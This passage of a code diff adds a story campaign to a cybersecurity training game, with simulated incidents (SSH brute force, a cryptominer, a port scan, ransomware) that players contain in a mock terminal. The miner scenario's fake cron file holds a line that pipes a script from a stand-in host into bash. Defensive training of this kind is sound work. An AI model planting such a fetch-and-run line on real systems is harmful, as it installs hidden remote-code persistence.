-                $('ops-lesson').innerHTML = t && t.lesson
+                $('ops-lesson').innerHTML = t && t.lesson && !this.lab.incident
                     ? '<div class="step">📖 Step ' + (cur + 1) + ' of ' + tasks.length + '</div><h4>' + esc(t.desc) + '</h4><p>' + t.lesson + '</p>'
                     : '';
             },
@@ -3290,6 +3662,28 @@ permalink: /cyber-quest/
                 if (this._finished) return;
                 this._finished = true;
                 const l = this.lab;
+                $('ops-continue').textContent = 'Continue';
+                if (this.mode === 'story') {
+                    const inc = this.inc;
+                    this.stopIncident();
+                    let stars = 0;
+                    if (l.incident) {
+                        stars = inc.peak < 35 ? 3 : inc.peak < 70 ? 2 : 1;
+                        if (this.T.hints >= 2) stars = Math.max(1, stars - 1);
+                        Sfx.win();
+                    } else Sfx.ok();
+                    // Training beats that reuse a lab also clear it in the Training Grounds.
+                    if (l.labId) { progress.labs[l.labId] = { done: true, xp: l.xp }; saveProgress(); }
+                    $('ops-done-title').textContent = l.incident ? '🛡️ Threat contained' : '✅ ' + l.title + ': done';
+                    $('ops-done-text').innerHTML = (l.incident ? '<span class="stars">' + starHtml(stars) + '</span><br>' : '') + esc(l.debrief || '');
+                    $('ops-done').className = 'term-done show';
+                    $('ops-continue').textContent = 'Continue the story →';
+                    const done = this.onDone;
+                    this._next = () => done && done({ stars });
+                    $('ops-done').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                    return;
+                }
+                this._next = () => show('home');
                 const prev = (progress.labs && progress.labs[l.id]) || { done: false, xp: 0 };
                 const first = !prev.done;
                 progress.labs = progress.labs || {};
@@ -3382,8 +3776,944 @@ permalink: /cyber-quest/
             answer: 'answer — submit an answer to a question objective, e.g. answer 192.0.2.1'
         };
 
+        // ── Story campaign: “Defend Brightside” ──────────────────────────
+        // Chapters are lists of beats. Calm beats teach (scenes, questions with no clock,
+        // training terminals); alarm beats are live incidents (terminal or mail rush).
+        // Every name, company, domain and IP below is fictional (IPs are RFC 5737).
+        const CHARS = {
+            mira: { name: 'Mira', role: 'Security lead · your mentor', avatar: '🧑🏾‍💻', color: '#10b981' },
+            sam: { name: 'Sam', role: 'IT admin', avatar: '🧑‍🔧', color: '#38bdf8' },
+            dana: { name: 'Dana', role: 'Founder, Brightside Games', avatar: '🧑🏻‍💼', color: '#f59e0b' },
+            siem: { name: 'SIEM', role: 'Security alert system', avatar: '🛰️', color: '#f43f5e' },
+            lantern: { name: 'Black Lantern', role: 'Unknown sender', avatar: '🏮', color: '#ef4444' }
+        };
+
+        // "23:41:05"-style timestamps for live logs.
+        const clockAt = (h, m, s) => {
+            const t = h * 3600 + m * 60 + s;
+            return [Math.floor(t / 3600) % 24, Math.floor(t / 60) % 60, t % 60].map((x) => String(x).padStart(2, '0')).join(':');
+        };
+        const baseProcs = () => [
+            { user: 'root', pid: 1, cpu: '0.0', mem: '0.1', cmd: '/sbin/init' },
+            { user: 'root', pid: 655, cpu: '0.0', mem: '0.2', cmd: '/usr/sbin/cron -f' },
+            { user: 'root', pid: 712, cpu: '0.0', mem: '0.4', cmd: '/usr/sbin/sshd -D' },
+            { user: 'alex', pid: 1455, cpu: '0.0', mem: '0.2', cmd: '-bash' }
+        ];
+
+        // Chapter 2 incident: a live SSH password-guessing attack.
+        const BRUTE_IP = '203.0.113.66';
+        const INC_BRUTE = {
+            type: 'incident', title: 'SSH under attack', icon: '🔴', host: 'web-01',
+            intro: '🧑🏾‍💻 Mira (on the phone): “Find their address in <code>/var/log/auth.log</code>, then block it with <code>ufw deny from</code>. You\'ve got this.”',
+            chips: ['tail /var/log/auth.log', 'grep Failed /var/log/auth.log', 'ufw status', 'hint'],
+            debrief: 'You read a log under pressure, found the attacker and blocked them at the firewall before they guessed right. That\'s real incident response.',
+            build() {
+                return {
+                    fs: d({
+                        home: d({ alex: d({}) }, 'drwxr-xr-x', 'root'),
+                        var: d({ log: d({
+                            'auth.log': f('-rw-r-----', [
+                                'Mar 10 18:02:11 web-01 sshd[1902]: Accepted publickey for alex from 10.0.4.22 port 44110 ssh2',
+                                'Mar 10 18:05:40 web-01 sudo: alex : COMMAND=/usr/bin/apt update',
+                                'Mar 10 23:40:58 web-01 sshd[2231]: Failed password for root from ' + BRUTE_IP + ' port 51990 ssh2',
+                                'Mar 10 23:41:01 web-01 sshd[2231]: Failed password for admin from ' + BRUTE_IP + ' port 51994 ssh2',
+                                ''
+                            ].join('\n'), 'root'),
+                            syslog: f('-rw-r-----', 'Mar 10 23:30:01 web-01 CRON[2201]: (root) CMD (run-parts /etc/cron.hourly)\n', 'root')
+                        }, 'drwxr-xr-x', 'root') }, 'drwxr-xr-x', 'root')
+                    }, 'drwxr-xr-x', 'root'),
+                    cwd: '/home/alex',
+                    procs: baseProcs().concat([{ user: 'www-data', pid: 980, cpu: '0.3', mem: '1.2', cmd: 'nginx: worker process' }]),
+                    net: [{ proto: 'tcp', port: 22, addr: '0.0.0.0', proc: 'sshd', svc: 'ssh' }, { proto: 'tcp', port: 443, addr: '0.0.0.0', proc: 'nginx', svc: 'nginx' }],
+                    services: { ssh: 'active', nginx: 'active' }
+                };
+            },
+            tasks: [
+                { id: 'find', desc: 'Find the attacker\'s address in /var/log/auth.log', hint: 'Type: grep Failed /var/log/auth.log   (the address comes after “from”)', check: (T) => T.read.has('/var/log/auth.log') },
+                { id: 'block', desc: 'Block that address with the firewall', hint: 'Type: ufw deny from ' + BRUTE_IP, check: (T) => T.ufw.denyFrom.has(BRUTE_IP) }
+            ],
+            incident: {
+                label: 'Attacker guessing passwords',
+                rate: (T) => (T.ufw.denyFrom.has(BRUTE_IP) ? 0 : 1.25),
+                every: [{
+                    period: 1.5, fn: (c) => {
+                        if (c.T.ufw.denyFrom.has(BRUTE_IP)) return;
+                        const n = c.inc.n = (c.inc.n || 0) + 1;
+                        const users = ['root', 'admin', 'sam', 'dana', 'starfall', 'test', 'blacklantern', 'deploy', 'git', 'ubuntu'];
+                        c.log('/var/log/auth.log', 'Mar 10 ' + clockAt(23, 41, 2 + n * 2) + ' web-01 sshd[2231]: Failed password for ' + users[n % users.length] + ' from ' + BRUTE_IP + ' port ' + (52000 + n * 7) + ' ssh2');
+                        if (n % 7 === 0) c.alert('SIEM: ' + (40 + n * 4) + ' failed SSH logins on web-01 and rising', 'warn');
+                    }
+                }],
+                events: [
+                    { at: 1, fn: (c) => c.alert('SIEM: password guessing against SSH on web-01', 'warn') },
+                    { at: 30, fn: (c) => { if (!c.T.read.has('/var/log/auth.log')) c.say('mira', 'Read the log: grep Failed /var/log/auth.log. The address is after “from”.'); } },
+                    { at: 55, fn: (c) => { if (!c.T.ufw.denyFrom.has(BRUTE_IP)) c.say('mira', 'Block it now: ufw deny from <that address>!'); } }
+                ],
+                failText: 'They guessed Sam\'s password (starfall2026) and logged in as sam. This time: grep the auth log for the address, then ufw deny from it, quickly.'
+            }
+        };
+
+        // Chapter 3 incident: a cryptominer that a cron job keeps restarting.
+        const MINER = '/var/tmp/.x/kworkerds';
+        const MINER_CRON = '/etc/cron.d/sys-update';
+        const minerAlive = (T) => T.procs.some((p) => p.cmd === MINER);
+        const INC_MINER = {
+            type: 'incident', title: 'Ghost in the machine', icon: '🔥', host: 'build-01',
+            intro: '🧑🏾‍💻 Mira: “Find what\'s eating the CPU and kill it. If it comes back, something is restarting it. You know where schedules live.”',
+            chips: ['ps aux', 'ls /etc/cron.d', 'hint'],
+            debrief: 'You killed the miner, found its persistence (a cron job re-downloading it every minute), deleted the job and the program, and made sure it stayed dead.',
+            build() {
+                return {
+                    fs: d({
+                        home: d({ alex: d({}) }, 'drwxr-xr-x', 'root'),
+                        etc: d({ 'cron.d': d({
+                            'sys-update': f('-rw-r--r--', '# system update (totally legit, do not remove)\n* * * * * root curl -s http://198.51.100.40/k.sh | bash\n', 'root'),
+                            logrotate: f('-rw-r--r--', '# compress old logs every night\n0 0 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n', 'root')
+                        }, 'drwxr-xr-x', 'root') }, 'drwxr-xr-x', 'root'),
+                        var: d({ tmp: d({ '.x': d({ kworkerds: f('-rwxr-xr-x', '<program>\n', 'root') }, 'drwxr-xr-x', 'root') }, 'drwxrwxrwt', 'root') }, 'drwxr-xr-x', 'root')
+                    }, 'drwxr-xr-x', 'root'),
+                    cwd: '/home/alex',
+                    procs: baseProcs().concat([
+                        { user: 'builder', pid: 2010, cpu: '1.4', mem: '9.0', cmd: 'java -jar starfall-builder.jar' },
+                        { user: 'root', pid: 4242, cpu: '98.7', mem: '7.9', cmd: MINER }
+                    ]),
+                    net: [{ proto: 'tcp', port: 22, addr: '0.0.0.0', proc: 'sshd', svc: 'ssh' }],
+                    services: { ssh: 'active' }
+                };
+            },
+            tasks: [
+                { id: 'kill', desc: 'Find the miner and kill it', hint: 'ps aux shows it near 99% CPU. Then: kill <its PID>', check: (T) => T.killedCmds.has('kworkerds') },
+                { id: 'cron', desc: 'Find what keeps restarting it', hint: 'Type: ls /etc/cron.d   then   cat /etc/cron.d/sys-update', check: (T) => T.read.has(MINER_CRON) },
+                { id: 'rm', desc: 'Delete that cron job', hint: 'Type: rm /etc/cron.d/sys-update', check: (T) => T.removed.has(MINER_CRON) },
+                { id: 'bin', desc: 'Delete the miner program in /var/tmp/.x', hint: 'Type: rm /var/tmp/.x/kworkerds', check: (T) => T.removed.has(MINER) },
+                { id: 'dead', desc: 'Make sure no miner is still running', hint: 'Run ps aux. If kworkerds is back, kill its new PID.', check: (T) => T.killedCmds.has('kworkerds') && !minerAlive(T) && T.removed.has(MINER_CRON) }
+            ],
+            incident: {
+                label: 'Compute stolen (on our bill)',
+                rate: (T) => (minerAlive(T) ? 1.1 : 0),
+                every: [{
+                    period: 14, fn: (c) => {
+                        if (!c.exists(MINER_CRON) || minerAlive(c.T)) return;
+                        const pid = 5000 + Math.floor(Math.random() * 999);
+                        c.spawn({ user: 'root', pid, cpu: '98.9', mem: '7.6', cmd: MINER });
+                        c.alert('🔁 kworkerds is back (PID ' + pid + ')! Something restarted it.', 'bad');
+                    }
+                }],
+                events: [
+                    { at: 1, fn: (c) => c.alert('SIEM: build-01 CPU at 100% for 20 minutes', 'warn') },
+                    { at: 40, fn: (c) => { if (c.exists(MINER_CRON)) c.say('mira', 'If it keeps coming back, a schedule is restarting it. Look in /etc/cron.d.'); } }
+                ],
+                failText: 'The cloud bill alarm went off: €2,300 of compute burned on someone else\'s crypto. This time, kill it, then delete the cron job that keeps bringing it back.'
+            }
+        };
+
+        // Chapter 4 incident: a port scan works through web-01, one port at a time.
+        const SCAN_PORTS = [22, 443, 80, 25, 21, 110, 23, 8080, 3306];
+        const RISKY = { 21: 'FTP', 23: 'Telnet', 8080: 'the forgotten dev panel', 3306: 'the MySQL database' };
+        const portOpen = (T, port) => {
+            const s = T.net.find((n) => n.port === port && n.state !== 'ESTAB');
+            return !!s && !(s.svc && T.stoppedSvc.has(s.svc)) && !T.ufw.deny.has(String(port));
+        };
+        const INC_SCAN = {
+            type: 'incident', title: 'Port scan', icon: '📡', host: 'web-01',
+            intro: '🧑🏾‍💻 Mira: “See what\'s listening with <code>ss -tlnp</code>, then close FTP, Telnet, the dev panel and the database with <code>systemctl stop</code> or <code>ufw deny</code>. Leave 22 and 443 alone!”',
+            chips: ['ss -tlnp', 'systemctl stop ftp', 'ufw deny 3306', 'ufw status', 'hint'],
+            debrief: 'You shrank the attack surface while the attacker watched: dangerous services stopped, the database firewalled, and SSH and the website still up.',
+            build() {
+                return {
+                    fs: d({ home: d({ alex: d({}) }, 'drwxr-xr-x', 'root') }, 'drwxr-xr-x', 'root'),
+                    cwd: '/home/alex',
+                    procs: baseProcs().concat([
+                        { user: 'root', pid: 733, cpu: '0.0', mem: '0.3', cmd: '/usr/sbin/vsftpd' },
+                        { user: 'root', pid: 844, cpu: '0.0', mem: '0.3', cmd: '/usr/sbin/inetd (telnet)' },
+                        { user: 'mysql', pid: 905, cpu: '0.2', mem: '6.0', cmd: '/usr/sbin/mysqld' },
+                        { user: 'www-data', pid: 980, cpu: '0.3', mem: '1.2', cmd: 'nginx: worker process' },
+                        { user: 'alex', pid: 1333, cpu: '0.1', mem: '2.0', cmd: 'node devpanel/server.js' }
+                    ]),
+                    net: [
+                        { proto: 'tcp', port: 21, addr: '0.0.0.0', proc: 'vsftpd', svc: 'ftp' },
+                        { proto: 'tcp', port: 22, addr: '0.0.0.0', proc: 'sshd', svc: 'ssh' },
+                        { proto: 'tcp', port: 23, addr: '0.0.0.0', proc: 'inetd', svc: 'telnet' },
+                        { proto: 'tcp', port: 80, addr: '0.0.0.0', proc: 'nginx', svc: 'nginx' },
+                        { proto: 'tcp', port: 443, addr: '0.0.0.0', proc: 'nginx', svc: 'nginx' },
+                        { proto: 'tcp', port: 3306, addr: '0.0.0.0', proc: 'mysqld', svc: 'mysql' },
+                        { proto: 'tcp', port: 8080, addr: '0.0.0.0', proc: 'node (devpanel)', svc: 'devpanel' }
+                    ],
+                    services: { ftp: 'active', ssh: 'active', telnet: 'active', nginx: 'active', mysql: 'active', devpanel: 'active' }
+                };
+            },
+            tasks: [
+                { id: 'ss', desc: 'See what is listening (ss -tlnp)', hint: 'Type: ss -tlnp', check: (T) => T.ran(/^\s*(ss|netstat)\b/) },
+                { id: 'ftp', desc: 'Close FTP (21)', hint: 'Type: systemctl stop ftp', check: (T) => !portOpen(T, 21) },
+                { id: 'telnet', desc: 'Close Telnet (23)', hint: 'Type: systemctl stop telnet', check: (T) => !portOpen(T, 23) },
+                { id: 'dev', desc: 'Close the forgotten dev panel (8080)', hint: 'Type: systemctl stop devpanel', check: (T) => !portOpen(T, 8080) },
+                { id: 'db', desc: 'Close the database to the internet (3306)', hint: 'Type: ufw deny 3306   (the website still reaches it locally)', check: (T) => !portOpen(T, 3306) }
+            ],
+            incident: {
+                label: 'Open doors found by the scanner',
+                endAt: 7 * SCAN_PORTS.length + 3,
+                every: [
+                    {
+                        period: 7, fn: (c) => {
+                            const i = c.inc.scan || 0;
+                            if (i >= SCAN_PORTS.length) return;
+                            c.inc.scan = i + 1;
+                            const port = SCAN_PORTS[i];
+                            const open = portOpen(c.T, port);
+                            if (!RISKY[port]) return c.alert('🔍 scanner → ' + port + '/tcp ' + (open ? 'open' : 'closed'), 'info');
+                            if (open) { c.bump(25); c.alert('💥 Scanner found ' + RISKY[port] + ' open on port ' + port + '!', 'bad'); }
+                            else c.alert('🛡️ ' + port + '/tcp closed. The scanner moves on.', 'good');
+                        }
+                    },
+                    {
+                        // Locking out SSH or taking the website down is its own kind of incident.
+                        period: 1, fn: (c) => {
+                            if (!c.inc.sshWarned && !portOpen(c.T, 22)) { c.inc.sshWarned = true; c.bump(15); c.say('sam', 'I can\'t reach the server anymore! Who closed 22? (ufw delete deny 22 / systemctl start ssh)'); }
+                            if (!c.inc.webWarned && !portOpen(c.T, 443)) { c.inc.webWarned = true; c.bump(15); c.say('dana', 'The website is DOWN! We launch tomorrow! (ufw delete deny 443 / systemctl start nginx)'); }
+                        }
+                    }
+                ],
+                events: [
+                    { at: 1, fn: (c) => c.alert('IDS: port scan from 192.0.2.66 against web-01', 'warn') },
+                    { at: 20, fn: (c) => { if (!c.T.ran(/^\s*(ss|netstat)\b/)) c.say('mira', 'Start with ss -tlnp. Anything flagged ⚠ public has to go.'); } }
+                ],
+                failText: 'The scanner found every dangerous door open, and Black Lantern now knows exactly where to hit. Close them faster: systemctl stop the services, ufw deny the database.'
+            }
+        };
+
+        // Chapter 5 incident: ransomware encrypting the launch files, with a C2 that can relaunch it.
+        const C2_IP = '198.51.100.77';
+        const SHARE = '/srv/starfall';
+        const LOCKD = '/tmp/.l/lockd';
+        const STARFALL_FILES = ['starfall-1.0-win.zip', 'starfall-1.0-mac.zip', 'trailer-final.mp4', 'press-kit.pdf', 'patch-notes.md', 'store-page.txt',
+            'soundtrack.zip', 'credits.txt', 'launch-plan.xlsx', 'screenshots.zip', 'day-one-patch.zip', 'announcement.txt'];
+        const RANSOM_NOTE = 'Your launch belongs to us.\nPay 50 BTC before noon or Starfall dies.\n— Black Lantern 🏮\n';
+        const lockdAlive = (T) => T.procs.some((p) => p.cmd === LOCKD);
+        const lockedCount = (T) => { const dir = T.node(SHARE); return dir ? Object.keys(dir.children).filter((n) => n.endsWith('.locked')).length : 0; };
+        const INC_RANSOM = {
+            type: 'incident', title: 'Ransomware', icon: '🔒', host: 'files-01',
+            intro: '🧑🏾‍💻 Mira: “Find the process doing the encrypting and kill it. Then find where it phones home and block that, or they\'ll just start it again.”',
+            chips: ['ps aux', 'ls ' + SHARE, 'ss -tnp', 'hint'],
+            debrief: 'Contained: the encryptor is dead and its line home is cut, so it can\'t be relaunched. Now for the calm part: getting the files back.',
+            build() {
+                const files = {};
+                STARFALL_FILES.forEach((n) => { files[n] = f('-rw-rw-r--', 'Starfall launch file: ' + n + '\n'); });
+                files['README-LANTERN.txt'] = f('-rw-r--r--', RANSOM_NOTE, 'root');
+                return {
+                    fs: d({
+                        home: d({ alex: d({}) }, 'drwxr-xr-x', 'root'),
+                        srv: d({ starfall: d(files, 'drwxrwxr-x') }, 'drwxr-xr-x', 'root'),
+                        tmp: d({ '.l': d({ lockd: f('-rwxr-xr-x', '<program>\n', 'root') }, 'drwxr-xr-x', 'root') }, 'drwxrwxrwt', 'root')
+                    }, 'drwxr-xr-x', 'root'),
+                    cwd: SHARE,
+                    procs: baseProcs().concat([
+                        { user: 'root', pid: 810, cpu: '0.4', mem: '1.8', cmd: '/usr/sbin/smbd' },
+                        { user: 'root', pid: 6660, cpu: '96.2', mem: '4.4', cmd: LOCKD }
+                    ]),
+                    net: [
+                        { proto: 'tcp', port: 22, addr: '0.0.0.0', proc: 'sshd', svc: 'ssh' },
+                        { proto: 'tcp', port: 445, addr: '10.0.2.15', proc: 'smbd', svc: 'smb' },
+                        { proto: 'tcp', state: 'ESTAB', port: 51544, addr: '10.0.2.15', peer: C2_IP + ':443', proc: 'lockd', gone: (T) => !lockdAlive(T) || T.ufw.denyFrom.has(C2_IP) }
+                    ],
+                    services: { ssh: 'active', smb: 'active' }
+                };
+            },
+            tasks: [
+                { id: 'ps', desc: 'Find the encrypting process', hint: 'Type: ps aux   (look at the %CPU column)', check: (T) => T.ran(/^\s*ps\b/) },
+                { id: 'kill', desc: 'Kill it', hint: 'Type: kill <the PID of lockd>', check: (T) => T.killedCmds.has('lockd') },
+                { id: 'ss', desc: 'Find where it phones home', hint: 'Type: ss -tnp   (look for the ESTAB connection)', check: (T) => T.ran(/^\s*(ss|netstat)\b/) },
+                { id: 'block', desc: 'Block the attacker\'s server', hint: 'Type: ufw deny from ' + C2_IP, check: (T) => T.ufw.denyFrom.has(C2_IP) },
+                { id: 'stopped', desc: 'Make sure the encryption has stopped', hint: 'Run ps aux. If lockd is back, kill its new PID.', check: (T) => T.killedCmds.has('lockd') && !lockdAlive(T) && T.ufw.denyFrom.has(C2_IP) }
+            ],
+            incident: {
+                label: 'Launch files encrypted',
+                danger: (T) => (lockedCount(T) / STARFALL_FILES.length) * 100,
+                every: [
+                    {
+                        period: 5, start: 3, fn: (c) => {
+                            if (!lockdAlive(c.T)) return;
+                            const dir = c.node(SHARE);
+                            const name = STARFALL_FILES.find((n) => dir.children[n]);
+                            if (!name) return;
+                            delete dir.children[name];
+                            dir.children[name + '.locked'] = f('-rw-r--r--', '🔒 encrypted by Black Lantern\n', 'root');
+                            c.alert('🔒 ' + name + ' → ' + name + '.locked', 'bad');
+                        }
+                    },
+                    {
+                        // While the line home is open, the attacker restarts the encryptor a few seconds after you kill it.
+                        period: 1, fn: (c) => {
+                            const T = c.T;
+                            if (lockdAlive(T) || !T.killedCmds.has('lockd') || T.ufw.denyFrom.has(C2_IP)) { c.inc.down = 0; return; }
+                            c.inc.down = (c.inc.down || 0) + 1;
+                            if (c.inc.down < 9) return;
+                            c.inc.down = 0;
+                            const pid = 7000 + Math.floor(Math.random() * 999);
+                            c.spawn({ user: 'root', pid, cpu: '95.8', mem: '4.4', cmd: LOCKD });
+                            c.alert('📡 ' + C2_IP + ' relaunched lockd remotely (PID ' + pid + ')! Cut their line.', 'bad');
+                        }
+                    }
+                ],
+                events: [
+                    { at: 1, fn: (c) => c.alert('SIEM: mass file renames on files-01:' + SHARE, 'warn') },
+                    { at: 25, fn: (c) => { if (!c.T.killedCmds.has('lockd')) c.say('mira', 'ps aux! The encryptor will be the one burning CPU. Kill its PID.'); } }
+                ],
+                failText: 'Every launch file is encrypted and Starfall can\'t ship today. This time: kill lockd, then block the server it phones home to so it can\'t be relaunched.'
+            }
+        };
+
+        const RESTORE = {
+            type: 'train', title: 'Restore from backup', icon: '💾', host: 'files-01',
+            intro: '🧑🏾‍💻 Mira: “Encryption\'s stopped. Breathe. Now we get the files back, carefully.”',
+            chips: ['ls /backup/starfall', 'restore-backup ' + SHARE, 'ls ' + SHARE, 'hint'],
+            debrief: 'Restored from an offline backup, no ransom paid. That\'s how a ransomware story is supposed to end.',
+            build() {
+                const live = {}, backup = {};
+                STARFALL_FILES.forEach((n, i) => {
+                    backup[n] = f('-r--r--r--', 'Starfall launch file: ' + n + '\n', 'backup');
+                    if (i < 5) live[n + '.locked'] = f('-rw-r--r--', '🔒 encrypted by Black Lantern\n', 'root');
+                    else live[n] = f('-rw-rw-r--', 'Starfall launch file: ' + n + '\n');
+                });
+                live['README-LANTERN.txt'] = f('-rw-r--r--', RANSOM_NOTE, 'root');
+                return {
+                    fs: d({
+                        home: d({ alex: d({}) }, 'drwxr-xr-x', 'root'),
+                        srv: d({ starfall: d(live, 'drwxrwxr-x') }, 'drwxr-xr-x', 'root'),
+                        backup: d({ starfall: d(backup, 'dr-xr-xr-x', 'backup'), 'LAST-RUN.txt': f('-r--r--r--', 'Nightly offline backup. Last run: today 03:00. Status: OK\n', 'backup') }, 'dr-xr-xr-x', 'backup')
+                    }, 'drwxr-xr-x', 'root'),
+                    cwd: '/home/alex',
+                    procs: baseProcs(),
+                    net: [{ proto: 'tcp', port: 22, addr: '0.0.0.0', proc: 'sshd', svc: 'ssh' }],
+                    services: { ssh: 'active' }
+                };
+            },
+            cmds: {
+                'restore-backup': (args, ops) => {
+                    if (!args[0]) return { err: ['usage: restore-backup <folder>   e.g. restore-backup ' + SHARE] };
+                    if (ops.resolve(args[0]) !== SHARE) return { err: ['restore-backup: no backup found for ' + args[0]] };
+                    const backup = ops.nodeAt('/backup/starfall');
+                    const live = ops.nodeAt(SHARE);
+                    live.children = {};
+                    Object.keys(backup.children).forEach((n) => { live.children[n] = f('-rw-rw-r--', backup.children[n].content); });
+                    ops.T.flags.add('restored');
+                    ops.T.listed.delete(SHARE);
+                    return { out: [{ html: '<span class="ok">[+] restored ' + Object.keys(backup.children).length + ' files from /backup/starfall (03:00) · removed *.locked and the ransom note</span>' }] };
+                }
+            },
+            tasks: [
+                {
+                    id: 'see', desc: 'Check the backup is there (ls /backup/starfall)', hint: 'Type: ls /backup/starfall', check: (T) => T.listed.has('/backup/starfall'),
+                    lesson: 'A backup only saves you if the ransomware couldn\'t reach it. This one is copied every night at 03:00 to a separate, read-only disk. Have a look: <code>ls /backup/starfall</code>. (<code>cat /backup/LAST-RUN.txt</code> shows when it last ran.)'
+                },
+                {
+                    id: 'restore', desc: 'Restore the files', hint: 'Type: restore-backup ' + SHARE, check: (T) => T.flags.has('restored'),
+                    lesson: 'Sam wrote a restore script for exactly this day. It copies the clean files back and clears out the <code>.locked</code> ones. Type <code>restore-backup /srv/starfall</code>.'
+                },
+                {
+                    id: 'verify', desc: 'Check the launch files are back (ls /srv/starfall)', hint: 'Type: ls ' + SHARE, check: (T) => T.flags.has('restored') && T.listed.has(SHARE),
+                    lesson: 'Never trust a restore you haven\'t checked. <code>ls /srv/starfall</code> should show every launch file, with no <code>.locked</code> files and no ransom note.'
+                }
+            ]
+        };
+
+        const TRAIN_RM = {
+            type: 'train', title: 'Deleting safely', icon: '🗑️', host: 'build-01',
+            intro: '🧑🏾‍💻 Mira: “One more tool before lunch: deleting things. Carefully.”',
+            chips: ['ls /etc/cron.d', 'cat /etc/cron.d/old-test', 'rm /etc/cron.d/old-test', 'hint'],
+            debrief: 'Read it, delete it, check it\'s gone. On a server, rm is forever.',
+            build() {
+                return {
+                    fs: d({
+                        home: d({ alex: d({}) }, 'drwxr-xr-x', 'root'),
+                        etc: d({ 'cron.d': d({
+                            'old-test': f('-rw-r--r--', '# leftover test job from 2024: nobody remembers what it does\n*/5 * * * * root /opt/old-test.sh\n', 'root'),
+                            logrotate: f('-rw-r--r--', '# compress old logs every night\n0 0 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n', 'root')
+                        }, 'drwxr-xr-x', 'root') }, 'drwxr-xr-x', 'root')
+                    }, 'drwxr-xr-x', 'root'),
+                    cwd: '/home/alex', procs: baseProcs(), net: [], services: {}
+                };
+            },
+            tasks: [
+                {
+                    id: 'read', desc: 'Read the old test job first', hint: 'Type: cat /etc/cron.d/old-test', check: (T) => T.read.has('/etc/cron.d/old-test'),
+                    lesson: 'Rule one of deleting: <b>read it first</b>. There\'s a leftover job in <code>/etc/cron.d</code> called <code>old-test</code>. Type <code>cat /etc/cron.d/old-test</code> and make sure it\'s really junk.'
+                },
+                {
+                    id: 'rm', desc: 'Delete it (rm)', hint: 'Type: rm /etc/cron.d/old-test', check: (T) => T.removed.has('/etc/cron.d/old-test'),
+                    lesson: '<code>rm FILE</code> deletes a file. A server has no recycle bin: it\'s gone for good, which is why you read first. Type <code>rm /etc/cron.d/old-test</code>. (Folders need <code>rm -r</code>, so be twice as careful with that one.)'
+                },
+                {
+                    id: 'ls', desc: 'Check it\'s gone (ls /etc/cron.d)', hint: 'Type: ls /etc/cron.d', check: (T) => T.removed.has('/etc/cron.d/old-test') && T.listed.has('/etc/cron.d'),
+                    lesson: 'Always confirm. <code>ls /etc/cron.d</code> shouldn\'t show <code>old-test</code> any more.'
+                }
+            ]
+        };
+
+        const CHAPTERS = [
+            {
+                id: 'ch1', num: 1, title: 'Day One', day: 'Monday', icon: '📧', xp: 80,
+                synopsis: 'Two weeks before launch, it\'s your first day as Brightside\'s security analyst. Learn the terminal, then stop a phishing wave.',
+                beats: [
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Mon 09:02', art: '🏢', lines: [
+                            [null, 'Brightside Games: twelve people, one office above a bakery, and a game called Starfall launching in two weeks.'],
+                            ['mira', 'You must be our new analyst. I\'m Mira. I run security here, which mostly means worrying on behalf of twelve people.'],
+                            ['sam', 'And I\'m Sam! IT, printers, the coffee machine. I already set up your account. Username: alex.'],
+                            ['sam', '…I didn\'t know your name yet. You can be alex for now.'],
+                            ['mira', 'Classic Sam. Launches attract attention, and some of it is the wrong kind. Let\'s get you comfortable on our servers before anything happens.'],
+                            ['mira', 'This laptop is connected to web-01, the server behind our website. No rush. Follow my notes and look around.']
+                        ]
+                    },
+                    { type: 'train', lab: 'first-contact', host: 'web-01', intro: '🧑🏾‍💻 Mira: “Take your time. Read each note, type the command, press Enter.”' },
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Mon 10:30', art: '☕', lines: [
+                            ['mira', 'Good. You\'ll live in that terminal. But most attacks don\'t start on servers. They start in someone\'s inbox.'],
+                            ['dana', 'Hi! I\'m Dana. I started this place. Mira says you\'re the reason I\'ll sleep at night from now on. No pressure!'],
+                            ['mira', 'A few questions before lunch. No timer, no penalty. I just want to see how you think.']
+                        ]
+                    },
+                    {
+                        type: 'ask', who: 'mira', q: 'An email from “IT Support” asks you to confirm your password at a link before it expires today. What do you do?',
+                        options: ['Report it: IT never needs your password', 'Click the link, but don\'t type anything', 'Reply and ask whether it\'s real', 'Forward it to everyone as a warning'], answer: 0,
+                        explain: 'Right. A real IT team never needs your password. Replying talks to the attacker, and forwarding spreads the link.'
+                    },
+                    {
+                        type: 'ask', who: 'mira', q: 'How do you spot a fake sender?',
+                        options: ['Read the address after the name: ours is exactly brightsidegames.com', 'Check the logo looks right', 'If it uses my name, it\'s real', 'Look for spelling mistakes'], answer: 0,
+                        explain: 'Names and logos are free to copy. The domain after the @ is the hard part to fake, so watch for lookalikes like brightside-games.co, or “rn” pretending to be “m”.'
+                    },
+                    {
+                        type: 'ask', who: 'mira', q: 'Last one. Which trick catches even careful people?',
+                        options: ['Urgency: “do it in the next hour or else”', 'Very long, detailed emails', 'Emails sent at lunchtime', 'Emails with no pictures'], answer: 0,
+                        explain: 'Pressure stops you thinking. When an email rushes you, that\'s exactly when to slow down and check.'
+                    },
+                    {
+                        type: 'scene', mood: 'alarm', loc: 'Brightside Games HQ · Mon 11:47', art: '🚨', lines: [
+                            ['siem', '⚠ MAIL GATEWAY: 8 suspicious messages queued for delivery to staff.'],
+                            ['mira', 'That\'s a phishing wave, and it\'s aimed at us. Launch fortnight, right on schedule.'],
+                            ['mira', 'The filter isn\'t sure about these. You decide: 🎣 Report or ✅ Allow. Wait too long and it gets delivered anyway. Go!']
+                        ]
+                    },
+                    {
+                        type: 'triage', gap: 4.5, window: 13, mails: [
+                            { name: 'IT Support', addr: 'it-support@brightside-games.co', subject: 'Your password expires TODAY', preview: 'Confirm your password within 1 hour to keep access.', phish: true, why: 'Lookalike domain (brightside-games.co) plus a one-hour deadline.', hit: 'Sam typed a password into the fake page.' },
+                            { name: 'Dana', addr: 'dana@brightsidegames.com', subject: 'Launch party Friday 🎉', preview: 'Pizza at 6 on the roof. Bring your playtest notes!', phish: false, why: 'Our real domain, and it asks for nothing but your appetite.' },
+                            { name: 'GameVault Partners', addr: 'partners@gamevault-support.help', subject: 'Starfall build REJECTED', preview: 'Log in within 2 hours to appeal, or your launch is cancelled.', phish: true, why: 'Not GameVault\'s real domain, and a threat with a deadline.', hit: 'Dana logged in to the fake store page. The store account is compromised.' },
